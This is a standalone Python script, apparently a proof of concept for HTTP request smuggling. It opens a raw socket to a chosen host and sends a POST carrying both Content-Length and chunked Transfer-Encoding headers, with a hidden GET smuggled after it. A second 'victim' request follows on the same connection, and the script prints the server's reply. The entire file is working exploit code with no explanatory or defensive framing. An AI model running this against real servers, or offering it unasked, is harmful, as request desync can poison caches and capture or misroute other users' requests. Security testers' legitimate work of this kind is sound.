import socket
import sys
import time


def recv_all(sock, timeout=4.0):
    sock.settimeout(timeout)
    chunks = []
    while True:
        try:
            c = sock.recv(4096)
            if not c:
                break
            chunks.append(c)
        except socket.timeout:
            break
    return b"".join(chunks)


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    h = host.encode()

    s = socket.create_connection((host, port), timeout=8)
    s.settimeout(4)

    # 同时携带 CL 和 TE 的"投毒前缀"，后续 GET 期望被对端当作下一个请求解析
    poison = (
        b"POST / HTTP/1.1\r\n"
        b"Host: " + h + b"\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: 5\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
        b"0\r\n"
        b"\r\n"
        b"GET /nonexistent99999 HTTP/1.1\r\n"
        b"Host: " + h + b"\r\n"
        b"\r\n"
    )
    s.sendall(poison)
    time.sleep(0.5)

    victim = (
        b"GET / HTTP/1.1\r\n"
        b"Host: " + h + b"\r\n"
        b"Connection: close\r\n"
        b"\r\n"
    )
    s.sendall(victim)

    data = recv_all(s)
    s.close()
    print(data.decode("latin-1", "replace"))


if __name__ == "__main__":
    main()
